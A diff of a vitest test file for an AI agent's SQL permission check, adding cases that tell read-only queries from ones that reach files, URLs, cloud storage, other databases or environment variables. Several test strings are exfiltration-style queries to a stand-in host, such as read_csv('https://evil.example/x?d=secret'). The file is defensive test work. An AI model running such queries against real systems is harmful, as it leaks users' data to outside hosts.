@@ -1,8 +1,12 @@
 import { spawnSync } from 'node:child_process';
+import fs from 'node:fs';
+import path from 'node:path';
+import { fileURLToPath } from 'node:url';
 import { describe, expect, it } from 'vitest';
 import { AGENT_TOOLS, CALL_SKILL_NAMES } from '../agentTools';
 import {
   READ_ONLY_SQL_PATTERN,
+  SQL_WRITE_KEYWORDS,
   ZEOS_TOOL_CLASSES,
   ZEOS_TRUSTED_RESULTS,
   classifyToolCall,
@@ -27,7 +31,13 @@ const READ_ONLY = [
   'PRAGMA show_tables',
   'pragma database_list;',
   'SELECT created_at, updated_by, settings FROM t',
-  "SELECT * FROM read_csv('/input/a.csv')",
+  // Strings and identifiers that only look a little like a path or URL.
+  "SELECT strftime(d, '%d/%m/%Y') FROM t",
+  "SELECT * FROM t WHERE url LIKE 'https:%'",
+  "SELECT 'a.csv.bak', 'v1.2', 'x.csvy', 'csv' FROM t",
+  'SELECT "file.name", "x.parquet_id" FROM t',
+  "SELECT 'it''s a.csv''s' AS s",
+  'SELECT read, scan, glob_count, readme FROM t',
   // Comments, as the model writes them.
   '-- a comment\nSELECT 1',
   '-- Survival rate by passenger class\nSELECT Pclass, AVG(Survived) AS rate\nFROM train\nGROUP BY Pclass\nORDER BY Pclass;',
@@ -98,6 +108,49 @@ const NOT_READ_ONLY = [
   'PRAGMA threads = 4',
   '(SELECT 1)',
   'PIVOT train ON Sex USING COUNT(*)',
+  // Files, URLs and other databases: a "read" runs with no approval, so it
+  // must not reach any of them (review finding T3). read_csv on /input was a
+  // read before; LoadData has already loaded what a query reads.
+  "SELECT * FROM read_csv('/input/a.csv')",
+  "SELECT * FROM read_csv('https://evil.example/x?d=secret')",
+  "SELECT * FROM read_csv_auto('/input/a.csv')",
+  "SELECT * FROM read_parquet('s3://bucket/x.parquet')",
+  "SELECT * FROM read_json('/input/a.json')",
+  "SELECT * FROM read_json_auto('x')",
+  "SELECT * FROM read_ndjson_objects('x')",
+  "SELECT * FROM read_text('/scratchpad/notes.txt')",
+  "SELECT * FROM read_blob('/input/*')",
+  "SELECT * FROM read_xlsx('x')",
+  "SELECT * FROM glob('/input/*')",
+  "SELECT * FROM sniff_csv('/input/a.csv')",
+  "SELECT * FROM parquet_scan('x')",
+  "SELECT * FROM parquet_metadata('x')",
+  "SELECT * FROM iceberg_scan('x')",
+  "SELECT * FROM delta_scan('x')",
+  "SELECT * FROM sqlite_scan('x.db', 't')",
+  "SELECT * FROM postgres_query('db', 'SELECT 1')",
+  "SELECT * FROM mysql_query('db', 'SELECT 1')",
+  "SELECT * FROM st_read('x')",
+  "SELECT getenv('HOME')",
+  "SELECT * FROM query_table('t')",
+  "SELECT json_execute_serialized_sql('x')",
+  "SELECT * FROM 'https://evil.example/x.csv'",
+  "SELECT * FROM 'http://evil.example/data'",
+  "SELECT * FROM 's3://bucket/key'",
+  "SELECT * FROM 'hf://datasets/x/y'",
+  "FROM 'HTTPS://EVIL.EXAMPLE/X'",
+  "SELECT * FROM '/input/a.csv'",
+  "SELECT * FROM 'a.CSV'",
+  "SELECT * FROM 'a.csv.gz'",
+  "SELECT * FROM 'a.parquet'",
+  "SELECT * FROM 'a.jsonl'",
+  "SELECT * FROM t1 JOIN 'b.tsv' USING (id)",
+  'SELECT * FROM "a.csv"',
+  'SELECT * FROM "https://evil.example/x"',
+  "DESCRIBE 'a.parquet'",
+  "SUMMARIZE 'https://evil.example/x.csv'",
+  "SELECT 'https://evil.example/?' || secret FROM t",
+  "PRAGMA table_info('a.csv')",
 ];
 
 describe('isReadOnlySql', () => {
@@ -106,6 +159,32 @@ describe('isReadOnlySql', () => {
   });
   it.each(NOT_READ_ONLY)('not read-only: %j', (sql) => {
     expect(isReadOnlySql(sql)).toBe(false);
+  });
+});
+
+describe('every write keyword', () => {
+  it('is all 36 of them', () => {
+    expect(SQL_WRITE_KEYWORDS.length).toBe(36);
+    expect(new Set(SQL_WRITE_KEYWORDS).size).toBe(36);
+  });
+  it.each(SQL_WRITE_KEYWORDS)('%s makes a statement an effect, alone and under EXPLAIN ANALYZE', (kw) => {
+    for (const k of [kw, kw.toLowerCase()]) {
+      expect(isReadOnlySql(`SELECT ${k} FROM t`)).toBe(false);
+      expect(isReadOnlySql(`SELECT 1 ${k}`)).toBe(false);
+      expect(isReadOnlySql(`${k} t`)).toBe(false);
+      expect(isReadOnlySql(`EXPLAIN ANALYZE ${k} t`)).toBe(false);
+      expect(isReadOnlySql(`EXPLAIN ANALYZE SELECT ${k} FROM t`)).toBe(false);
+      expect(isReadOnlySql(`WITH x AS (SELECT 1) SELECT ${k}(x) FROM x`)).toBe(false);
+    }
+  });
+  it.each(SQL_WRITE_KEYWORDS)('%s is only text in a string, quoted identifier or comment', (kw) => {
+    expect(isReadOnlySql(`SELECT '${kw}' FROM t`)).toBe(true);
+    expect(isReadOnlySql(`SELECT "${kw}" FROM t`)).toBe(true);
+    expect(isReadOnlySql(`SELECT 1 -- ${kw}`)).toBe(true);
+    expect(isReadOnlySql(`SELECT /* ${kw} */ 1`)).toBe(true);
+    expect(isReadOnlySql(`EXPLAIN ANALYZE SELECT a AS "${kw}" FROM t`)).toBe(true);
+    // Part of a longer word is not the keyword.
+    expect(isReadOnlySql(`SELECT ${kw}_x, x_${kw} FROM t`)).toBe(true);
   });
 });
 
@@ -179,45 +258,69 @@ describe('zeosAgentTools', () => {
 });
 
 // The ZEOS machine compiles the same pattern with Python's `re`; check that it
-// reaches the same verdicts, so the UI never disagrees with the kernel.
+// reaches the same verdicts, so the UI never disagrees with the kernel. The
+// rules are the wheel's own (`_compile_rule` / `_rule_matches` and
+// `_exact_rule` / `_exact_matches` in chat_machine.py), imported from the
+// synced wheels in public/zeos (pure Python, so they import from the .whl).
+const here = path.dirname(fileURLToPath(import.meta.url));
+const wheelDir = path.resolve(here, '..', '..', '..', 'public', 'zeos', 'wheels');
+const wheels = fs.existsSync(wheelDir)
+  ? fs
+      .readdirSync(wheelDir, { recursive: true, encoding: 'utf8' })
+      .filter((f) => f.endsWith('.whl'))
+      .map((f) => path.join(wheelDir, f))
+  : [];
 const python = spawnSync('python3', ['--version']).status === 0;
-describe.skipIf(!python)('the pattern under Python re', () => {
-  it('agrees with RegExp on every case', () => {
-    const cases = [...READ_ONLY, ...NOT_READ_ONLY];
-    const script =
-      'import json, re, sys\n' +
-      'data = json.load(sys.stdin)\n' +
-      'p = re.compile(data["pattern"], re.IGNORECASE | re.DOTALL)\n' +
-      'print(json.dumps([p.fullmatch(c) is not None for c in data["cases"]]))\n';
-    const out = spawnSync('python3', ['-c', script], {
-      input: JSON.stringify({ pattern: READ_ONLY_SQL_PATTERN, cases }),
-      encoding: 'utf8',
-    });
-    expect(out.stderr).toBe('');
-    expect(JSON.parse(out.stdout)).toEqual(cases.map(isReadOnlySql));
+const wheelImports =
+  python &&
+  wheels.length > 0 &&
+  spawnSync(
+    'python3',
+    ['-c', 'import sys; sys.path[:0] = sys.argv[1:]; import zeos_coop_count_web.chat_machine', ...wheels],
+    { encoding: 'utf8' },
+  ).status === 0;
+const parityReason = !python
+  ? 'python3 not found'
+  : wheels.length === 0
+    ? 'public/zeos/wheels missing; run `npm run zeos:sync`'
+    : 'the wheel does not import under this python3';
+
+function runWheel(body: string, data: unknown): unknown {
+  const script =
+    'import json, sys\n' +
+    'sys.path[:0] = sys.argv[1:]\n' +
+    'from zeos_coop_count_web import chat_machine as cm\n' +
+    'data = json.load(sys.stdin)\n' +
+    body;
+  const out = spawnSync('python3', ['-c', script, ...wheels], { input: JSON.stringify(data), encoding: 'utf8' });
+  expect(out.stderr).toBe('');
+  return JSON.parse(out.stdout);
+}
+
+describe.skipIf(!wheelImports)(`the rules as the ZEOS wheel applies them${wheelImports ? '' : ` (skipped: ${parityReason})`}`, () => {
+  it('agrees with RegExp on every RunSQL case', () => {
+    const extra = SQL_WRITE_KEYWORDS.flatMap((kw) => [`SELECT ${kw} FROM t`, `EXPLAIN ANALYZE ${kw} t`, `SELECT '${kw}'`]);
+    const cases = [...READ_ONLY, ...NOT_READ_ONLY, ...extra];
+    const verdicts = runWheel(
+      'rule = cm._compile_rule(data["rule"])\n' +
+        'print(json.dumps([cm._rule_matches(rule, {"sql": c}) for c in data["cases"]]))\n',
+      { rule: (ZEOS_TOOL_CLASSES.RunSQL as { read_if: Record<string, string> }).read_if, cases },
+    );
+    expect(verdicts).toEqual(cases.map(isReadOnlySql));
+    expect(verdicts).toEqual(cases.map((sql) => classifyToolCall('RunSQL', { sql }) === 'read'));
   });
 
   it('agrees on the trusted-results rule', () => {
-    // As `_exact_rule` / `_exact_matches` in chat_machine.py: the rule arrives
-    // as JSON, a list of exact names, and a value is trusted iff it is one.
-    const values = ZEOS_TRUSTED_RESULTS.CallSkill.skill;
-    const cases = [
+    const cases: unknown[] = [
       ...CALL_SKILL_NAMES,
       ...CALL_SKILL_NAMES.map((s) => s.toUpperCase()),
-      'evil', 'sql2', 'python', 'data loading', 'SQL', 'Sql', ' sql', 'sql ', 'sql\n', 's.l',
+      'evil', 'sql2', 'python', 'data loading', 'SQL', 'Sql', ' sql', 'sql ', 'sql\n', 's.l', 1, ['sql'], null,
     ];
-    const script =
-      'import json, sys\n' +
-      'data = json.load(sys.stdin)\n' +
-      'values = data["values"]\n' +
-      'assert isinstance(values, list) and all(isinstance(v, str) for v in values)\n' +
-      'exact = frozenset(values)\n' +
-      'print(json.dumps([isinstance(c, str) and c in exact for c in data["cases"]]))\n';
-    const out = spawnSync('python3', ['-c', script], {
-      input: JSON.stringify({ values, cases }),
-      encoding: 'utf8',
-    });
-    expect(out.stderr).toBe('');
-    expect(JSON.parse(out.stdout)).toEqual(cases.map((skill) => isTrustedToolResult('CallSkill', { skill })));
+    const verdicts = runWheel(
+      'rule = cm._exact_rule("CallSkill", data["rule"])\n' +
+        'print(json.dumps([cm._exact_matches(rule, {"skill": c}) for c in data["cases"]]))\n',
+      { rule: ZEOS_TRUSTED_RESULTS.CallSkill, cases },
+    );
+    expect(verdicts).toEqual(cases.map((skill) => isTrustedToolResult('CallSkill', { skill })));
   });
 });
